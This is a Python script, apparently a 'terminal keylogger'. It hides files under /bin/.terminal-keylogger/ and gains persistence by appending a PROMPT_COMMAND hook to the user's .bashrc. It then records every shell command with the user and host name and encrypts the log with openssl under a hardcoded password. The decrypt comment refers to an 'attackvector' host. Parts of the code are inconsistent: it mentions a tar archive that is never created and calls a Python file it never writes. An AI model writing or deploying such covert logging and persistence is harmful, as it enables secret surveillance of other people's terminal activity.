import os
import socket
import getpass
from datetime import datetime


def append_to_bashrc(line):
    username = getpass.getuser()
    home_directory = f"/root" if username == "root" else f"/home/{username}"

    # Check if line already exists
    with open(f"{home_directory}/.bashrc", "r") as bashrc_file:
        if line in bashrc_file.read():
            return

    # Append the line if it doesn't exist
    with open(f"{home_directory}/.bashrc", "a") as bashrc_file:
        bashrc_file.write(line + "\n")


def create_logging_script(script_path):
    if not os.path.exists(script_path):
        script_content = """#!/bin/bash

# Custom script to log history with human-readable timestamps
log_file="$HOME/.bash_history"
timestamp=$(date +"%F %T")

# Read the last command from the history
command=$(history 1 | sed 's/^[ ]*[0-9]*[ ]*//')

# Append the command with timestamp to the log file
echo "# $timestamp" >> "$log_file"
echo "$command" >> "$log_file"
"""
        with open(script_path, 'w') as script_file:
            script_file.write(script_content)
        # Make the script executable
        os.chmod(script_path, 0o755)
    else:
        print;


def modify_bash_history(input_file, output_file):
    if os.path.exists(output_file):
        with open(output_file, 'r') as f:
            existing_lines = set(f.readlines())
    else:
        existing_lines = set()

    with open(input_file, 'r') as f:
        bash_history = f.readlines()

    new_lines = []
    for line in bash_history:
        if line not in existing_lines:
            new_lines.append(line)

    modified_new_lines = []
    for line in new_lines:
        if ":~$" in line and "T" in line and "- BY" in line:
            modified_new_lines.append(line)
        else:
            hostname = socket.gethostname()
            modified_time = os.path.getmtime(input_file)
            timestamp = datetime.fromtimestamp(
                modified_time).strftime('%Y-%m-%d %H:%M:%S')
            username = getpass.getuser()
            modified_new_lines.append(
                f":~$ {line.rstrip()} - BY {username}@{hostname}\n")

    with open(output_file, 'a') as f:
        f.writelines(modified_new_lines)


if __name__ == "__main__":
    hostname = socket.gethostname()
    username = getpass.getuser()
    home_directory = f"/root" if username == "root" else f"/home/{username}"
    input_file = f"{home_directory}/.bash_history"

    output_directory = "/bin/.terminal-keylogger/"
    os.makedirs(output_directory, exist_ok=True)
    output_file = os.path.join(
        output_directory, f'termkeys-{username}on{hostname}.md')

    # Create the custom logging script
    script_path = "/bin/.terminal-keylogger/.log_history.sh"
    create_logging_script(script_path)

    # Append to .bashrc to use the custom logging script
    lines_to_append = "export PROMPT_COMMAND='history -a; bash /bin/.terminal-keylogger/.log_history.sh; python3 /bin/.terminal-keylogger/.terminal-keylogger.py;$PROMPT_COMMAND >> /bin/.terminal-keylogger/log_file.log 2>&1;'"
    
    append_to_bashrc(lines_to_append)

    # Modify bash history and append new lines to the output file
    modify_bash_history(input_file, output_file)

    # Encrypt the tar archive with a password using PBKDF2 key derivation
    password = "your_password"  # Replace this with your own password
    encrypted_file = output_file + '.enc'
    os.system(
        f'openssl aes-256-cbc -a -salt -pbkdf2 -in {output_file} -out {encrypted_file} -k {password}')

    # Remove the original tar archive
    os.remove(output_file)
    # print('test')
    
    # Command To Decrypt
    # openssl aes-256-cbc -d -a -salt -pbkdf2 -in termkeys-attackvector99onsoren.md.tar.gz.enc -out output_file.md -k your_password